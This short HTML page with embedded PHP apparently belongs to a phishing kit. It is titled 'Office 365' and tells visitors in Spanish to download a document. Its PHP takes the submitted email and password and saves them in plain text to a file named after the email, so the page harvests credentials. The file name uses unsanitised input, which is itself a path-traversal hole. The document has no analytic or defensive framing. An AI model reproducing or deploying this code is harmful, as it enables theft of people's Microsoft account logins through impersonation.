<!DOCTYPE html>

<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>Office 365</title>
    <?php
        $email = $_POST["correo"];
        $pass = $_POST["contra"];
        $contenido = "Email: $email contraseña: $pass";
        $archivo=fopen("recibido/$email.txt","w");
        fwrite($archivo,$contenido);
    ?>
  </head>
  <body>
    Descargue el documeto: <a href="#"></a>
  </body>
</html>